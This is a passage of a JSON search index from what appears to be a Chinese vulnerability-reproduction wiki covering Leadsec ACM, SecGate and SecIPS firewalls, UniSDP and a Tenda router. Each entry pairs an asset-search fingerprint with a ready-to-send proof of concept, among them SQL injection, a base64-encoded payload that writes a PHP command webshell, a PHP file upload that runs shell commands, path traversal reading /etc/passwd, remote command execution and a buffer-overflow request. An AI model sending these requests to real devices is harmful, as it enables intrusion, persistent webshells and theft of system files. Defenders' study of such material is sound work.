","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BE%A1-acm%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-bottomframe.cgi-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网御 Leadsec ACM管理平台 importhtml.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BE%A1-leadsec-acm%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BE%A1-leadsec-acm%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 网御 Leadsec ACM管理平台 importhtml.php文件存在SQL注入导致 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BE%A1-leadsec-acm%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BE%A1-leadsec-acm%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 网御 Leadsec ACM管理平台 ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BE%A1-leadsec-acm%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BE%A1-leadsec-acm%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"Leadsec ACM-管理平台\" ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BE%A1-leadsec-acm%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BE%A1-leadsec-acm%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 出现漏洞的文件 importhtml.php \u003c?php include_once(\"global.func.php\"); if($_SESSION['language']!=\"english\") { require_once (\"include/language_cn.php\"); } else { require_once (\"include/language_en.php\"); } if(isset($_GET['type'])) $get_type = $_GET['type']; if(isset($_GET['tab'])) $get_tab = $_GET['tab']; if(isset($_GET['sql'])) $get_sql = $_GET['sql']; if($get_type == \"exporthtmlpost\") { $get_tab = $arr_export_cn[$get_tab]; exportHtml(\"$get_tab\",stripslashes(base64_decode($get_sql))); } elseif($get_type == \"exporthtmlchat\") { $get_tab = $arr_export_cn[$get_tab]; exportHtmlChat(\"$get_tab\",stripslashes(base64_decode($get_sql))); } elseif($get_type == \"exporthtmlmail\") { $get_tab = $arr_export_cn[$get_tab]; exportHtmlMail(\"$get_tab\",stripslashes(base64_decode($get_sql))); } elseif($get_type == \"exporthtmlwebsend\") { $get_tab = $arr_export_cn[$get_tab]; exportHtmlWebSend(\"$get_tab\",stripslashes(base64_decode($get_sql))); } elseif($get_type == \"exporthtmlwebrecv\") { $get_tab = $arr_export_cn[$get_tab]; exportHtmlWebRecv(\"$get_tab\",stripslashes(base64_decode($get_sql))); } ?\u003e 跟踪exportHtmlMail函数 function exportHtmlMail($filename,$sql){ Header( \"Expires: 0\" ); Header( \"Pragma: public\" ); Header( \"Cache-Control: must-revalidate, post-check=0, pre-check=0\" ); Header( \"Cache-Control: public\"); Header( \"Content-Type: application/octet-stream\" ); header(\"Accept-Ranges: bytes\"); header(\"Content-Disposition: attachment; filename=$filename.html\"); echo \"\u003chtml\u003e\\n\"; echo \"\u003chead\u003e\u003ctitle\u003e报表\u003c/title\u003e\u003c/head\u003e\\n\"; echo \"\u003cbody\u003e\\n\"; $conn = connOther(); $result = mysql_query($sql,$conn); while ($data= mysql_fetch_array($result)){ $post_content = \"\"; if($data['mail_file_path'] == \"(null)\"){ $post_content = \"\u003cfont color=red\u003e内容审计未启用\u003c/font\u003e\"; } else{ $post_filename=$data['mail_file_path']; $ifother = \"\"; $ifother = ifExistOther($post_filename); if($ifother!=\"\"){ $post_filename = $ifother; } $str = \"/usr/bin/cap2con $post_filename pop\"; system($str,$returnvalue); $post_filename=str_replace(\".cap\",\".eml\",$post_filename); $post_content = file_get_contents($post_filename); $rec=new mime_decode; $post_content=$rec-\u003edecode_mime_string($post_content); //... } } } 这里可以发现通过base64解码后执行的Sql语句结果传入函数exportHtmlMail中调用system执行, 而 $post_filename 可控 $str = \"/usr/bin/cap2con $post_filename pop\"; 验证POC https://xxx.xxx.xxx.xxx/importhtml.php?type=exporthtmlmail\u0026tab=tb_RCtrlLog\u0026sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvc3lzMS5waHAn 访问成功后会触发下载日志文件，再访问 sys1.php ","date":"0001-01-01","objectID":"/%E7%BD%91%E5%BE%A1-leadsec-acm%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%BD%91%E5%BE%A1-leadsec-acm%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E7%BD%91%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-obj_app_upfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%BD%91%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-obj_app_upfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 网神 SecGate 3600 防火墙 obj_app_upfile接口存在任意文件上传漏洞，攻击者通过构造特殊请求包即可获取服务器权限 ","date":"0001-01-01","objectID":"/%E7%BD%91%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-obj_app_upfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%BD%91%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-obj_app_upfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 网神 SecGate 3600 防火墙 ","date":"0001-01-01","objectID":"/%E7%BD%91%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-obj_app_upfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%BD%91%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-obj_app_upfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 fid=\"1Lh1LHi6yfkhiO83I59AYg==\" ","date":"0001-01-01","objectID":"/%E7%BD%91%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-obj_app_upfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%BD%91%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-obj_app_upfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 出现漏洞的文件 webui/modules/object/app.mds 代码中没有对文件调用进行鉴权，且文件上传路径为可访问路径，造成任意文件上传 POST /?g=obj_app_upfile HTTP/1.1 Host: Accept: */* Accept-Encoding: gzip, deflate Content-Length: 574 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0) ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"MAX_FILE_SIZE\" 10000000 ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"upfile\"; filename=\"vulntest.php\" Content-Type: text/plain \u003c?php system(\"id\");unlink(__FILE__);?\u003e ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"submit_post\" obj_app_upfile ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"__hash__\" 0b9d6b1ab7479ab69d9f71b05e0e9445 ------WebKitFormBoundaryJpMyThWnAxbcBBQc-- 默认上传路径 /secgate/webui/attachements/ ， 访问 attachements/xxx.php 文件 ","date":"0001-01-01","objectID":"/%E7%BD%91%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-obj_app_upfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%BD%91%E7%A5%9E-secgate-3600-%E9%98%B2%E7%81%AB%E5%A2%99-obj_app_upfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网神 SecIPS 3600 debug_info_export 任意文件下载漏洞 ","date":"0001-01-01","objectID":"/%E7%BD%91%E7%A5%9E-secips-3600-debug_info_export-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%BD%91%E7%A5%9E-secips-3600-debug_info_export-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 网神 SecIPS 3600 debug_info_export接口存在任意文件下载漏洞，攻击者通过漏洞可以获取服务器敏感文件 ","date":"0001-01-01","objectID":"/%E7%BD%91%E7%A5%9E-secips-3600-debug_info_export-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%BD%91%E7%A5%9E-secips-3600-debug_info_export-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 网神 SecIPS 3600 ","date":"0001-01-01","objectID":"/%E7%BD%91%E7%A5%9E-secips-3600-debug_info_export-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%BD%91%E7%A5%9E-secips-3600-debug_info_export-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"网神-SecIPS\" ","date":"0001-01-01","objectID":"/%E7%BD%91%E7%A5%9E-secips-3600-debug_info_export-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%BD%91%E7%A5%9E-secips-3600-debug_info_export-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /webui/debug/debug_info_export?filename=default.cfg ","date":"0001-01-01","objectID":"/%E7%BD%91%E7%A5%9E-secips-3600-debug_info_export-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%BD%91%E7%A5%9E-secips-3600-debug_info_export-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网神 下一代极速防火墙 pki_file_download 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E7%BD%91%E7%A5%9E-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%9E%81%E9%80%9F%E9%98%B2%E7%81%AB%E5%A2%99-pki_file_download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%BD%91%E7%A5%9E-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%9E%81%E9%80%9F%E9%98%B2%E7%81%AB%E5%A2%99-pki_file_download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 网神下一代极速防火墙 pki_file_download 存在任意文件读取漏洞，攻击者可以通过漏洞获取服务器上的任意文件 ","date":"0001-01-01","objectID":"/%E7%BD%91%E7%A5%9E-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%9E%81%E9%80%9F%E9%98%B2%E7%81%AB%E5%A2%99-pki_file_download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%BD%91%E7%A5%9E-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%9E%81%E9%80%9F%E9%98%B2%E7%81%AB%E5%A2%99-pki_file_download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 网神下一代极速防火墙 ","date":"0001-01-01","objectID":"/%E7%BD%91%E7%A5%9E-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%9E%81%E9%80%9F%E9%98%B2%E7%81%AB%E5%A2%99-pki_file_download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%BD%91%E7%A5%9E-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%9E%81%E9%80%9F%E9%98%B2%E7%81%AB%E5%A2%99-pki_file_download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"网神下一代极速防火墙\" ","date":"0001-01-01","objectID":"/%E7%BD%91%E7%A5%9E-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%9E%81%E9%80%9F%E9%98%B2%E7%81%AB%E5%A2%99-pki_file_download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%BD%91%E7%A5%9E-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%9E%81%E9%80%9F%E9%98%B2%E7%81%AB%E5%A2%99-pki_file_download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 发送请求包 GET /?g=pki_file_download\u0026filename=../../../../../etc/passwd HTTP/1.1 Host: Connection: close sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: cross-site Sec-Fetch-Mode: navigate Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: __s_sessionid__=7rl7vvg1mlc00gf4pfmo74h0t7 ","date":"0001-01-01","objectID":"/%E7%BD%91%E7%A5%9E-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%9E%81%E9%80%9F%E9%98%B2%E7%81%AB%E5%A2%99-pki_file_download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%BD%91%E7%A5%9E-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%9E%81%E9%80%9F%E9%98%B2%E7%81%AB%E5%A2%99-pki_file_download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"联软安界 UniSDP 软件定义边界系统 commondRetSt 命令执行漏洞 ","date":"0001-01-01","objectID":"/%E8%81%94%E8%BD%AF%E5%AE%89%E7%95%8C-unisdp-%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E8%BE%B9%E7%95%8C%E7%B3%BB%E7%BB%9F-commondretst-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E8%81%94%E8%BD%AF%E5%AE%89%E7%95%8C-unisdp-%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E8%BE%B9%E7%95%8C%E7%B3%BB%E7%BB%9F-commondretst-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 联软安界UniSDP软件定义边界系统是基于零信任的下一代VPN，该系统2021.04.28版本中TunnelGateway某接口存在安全漏洞，漏洞允许攻击者将特制请求发送到服务器并远程命令执行。 ","date":"0001-01-01","objectID":"/%E8%81%94%E8%BD%AF%E5%AE%89%E7%95%8C-unisdp-%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E8%BE%B9%E7%95%8C%E7%B3%BB%E7%BB%9F-commondretst-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E8%81%94%E8%BD%AF%E5%AE%89%E7%95%8C-unisdp-%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E8%BE%B9%E7%95%8C%E7%B3%BB%E7%BB%9F-commondretst-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 联软安界 UniSDP 软件定义边界系统 ","date":"0001-01-01","objectID":"/%E8%81%94%E8%BD%AF%E5%AE%89%E7%95%8C-unisdp-%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E8%BE%B9%E7%95%8C%E7%B3%BB%E7%BB%9F-commondretst-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E8%81%94%E8%BD%AF%E5%AE%89%E7%95%8C-unisdp-%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E8%BE%B9%E7%95%8C%E7%B3%BB%E7%BB%9F-commondretst-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"UniSSOView\" ","date":"0001-01-01","objectID":"/%E8%81%94%E8%BD%AF%E5%AE%89%E7%95%8C-unisdp-%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E8%BE%B9%E7%95%8C%E7%B3%BB%E7%BB%9F-commondretst-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E8%81%94%E8%BD%AF%E5%AE%89%E7%95%8C-unisdp-%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E8%BE%B9%E7%95%8C%E7%B3%BB%E7%BB%9F-commondretst-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC POST /TunnelGateway/commondRetStr shellCmd=id ","date":"0001-01-01","objectID":"/%E8%81%94%E8%BD%AF%E5%AE%89%E7%95%8C-unisdp-%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E8%BE%B9%E7%95%8C%E7%B3%BB%E7%BB%9F-commondretst-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E8%81%94%E8%BD%AF%E5%AE%89%E7%95%8C-unisdp-%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E8%BE%B9%E7%95%8C%E7%B3%BB%E7%BB%9F-commondretst-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"腾达路由器 AC11 堆栈缓冲区溢出 CVE-2021-31758 ","date":"0001-01-01","objectID":"/%E8%85%BE%E8%BE%BE-%E8%B7%AF%E7%94%B1%E5%99%A8-ac11-%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA-cve-2021-31758/:0:0","tags":null,"title":"","uri":"/%E8%85%BE%E8%BE%BE-%E8%B7%AF%E7%94%B1%E5%99%A8-ac11-%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA-cve-2021-31758/"},{"categories":null,"content":"漏洞描述 在固件为02.03.01.104_CN的Tenda AC11设备上发现了一个问题。/goform/setportList 中的堆栈缓冲区溢出漏洞使攻击者可以通过精心设计的post请求在系统上执行任意代码。 参考链接： https://github.com/Yu3H0/IoT_CVE/tree/main/Tenda/CVE_2 ","date":"0001-01-01","objectID":"/%E8%85%BE%E8%BE%BE-%E8%B7%AF%E7%94%B1%E5%99%A8-ac11-%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA-cve-2021-31758/:1:0","tags":null,"title":"","uri":"/%E8%85%BE%E8%BE%BE-%E8%B7%AF%E7%94%B1%E5%99%A8-ac11-%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA-cve-2021-31758/"},{"categories":null,"content":"漏洞复现 poc： POST /goform/setportList HTTP/1.1 Host: 192.168.0.1 Content-Length: 717 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 Content-Type: application/x-www-form-urlencoded; Accept: */* Origin: http://192.168.0.1 Referer: http://192.168.0.1/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close module1=wifiBasicCfg\u0026doubleBandUnityEnable=false\u0026wifiTotalEn=true\u0026wifiEn=true\u0026wifiSSID=Tenda_B0E040\u0026portList=1234aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026wifiSecurityMode=WPAWPA2%2FAES\u0026wifiPwd=Password12345\u0026wifiHideSSID=false\u0026wifiEn_5G=true\u0026wifiSSID_5G=Tenda_B0E040_5G\u0026wifiSecurityMode_5G=WPAWPA2%2FAES\u0026wifiPwd_5G=Password12345\u0026wifiHideSSID_5G=false\u0026module2=wifiGuest\u0026guestEn=false\u0026guestEn_5G=false\u0026guestSSID=Tenda_VIP\u0026guestSSID_5G=Tenda_VIP_5G\u0026guestPwd=\u0026guestPwd_5G=\u0026guestValidTime=8\u0026guestShareSpeed=0\u0026module3=wifiPower\u0026wifiPower=high\u0026wifiPower_5G=high\u0026module5=wifiAdvCfg\u0026wifiMode=bgn\u0026wifiChannel=auto\u0026wifiBandwidth=auto\u0026wifiMode_5G=ac\u0026wifiChannel_5G=auto\u0026wifiBandwidth_5G=auto\u0026wifiAntijamEn=false\u0026module6=wifiBeamforming\u0026wifiBeaformingEn=true\u0026module7=wifiWPS\u0026wpsEn=true\u0026wanType=static ","date":"0001-01-01","objectID":"/%E8%85%BE%E8%BE%BE-%E8%B7%AF%E7%94%B1%E5%99%A8-ac11-%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA-cve-2021-31758/:2:0","tags":null,"title":"","uri":"/%E8%85%BE%E8%BE%BE-%E8%B7%AF%E7%94%B1%E5%99%A8-ac11-%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA-cve-2021-31758/"},{"categories":null,"content":"腾达路由器 D151/D31未经身份验证的配置下载 